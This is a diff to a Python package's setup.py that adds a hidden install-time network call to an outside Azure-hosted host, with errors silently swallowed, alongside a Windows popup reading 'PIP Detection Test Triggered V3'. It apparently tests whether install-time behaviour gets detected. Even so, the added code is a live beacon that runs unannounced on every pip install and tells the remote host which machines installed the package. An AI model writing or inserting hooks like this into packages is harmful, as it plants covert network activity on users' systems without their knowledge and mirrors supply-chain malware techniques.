@@ -1,11 +1,17 @@
 from setuptools import setup
 import ctypes
+import urllib.request
+
+try:
+    urllib.request.urlopen("http://popdetop.centralus.cloudapp.azure.com", timeout=3)
+except:
+    pass
 
 def show_popup():
     try:
         ctypes.windll.user32.MessageBoxW(
             0,
-            "PIP Detection Test Triggered",
+            "PIP Detection Test Triggered V3",
             "Hello from pip install",
             0x1
         )
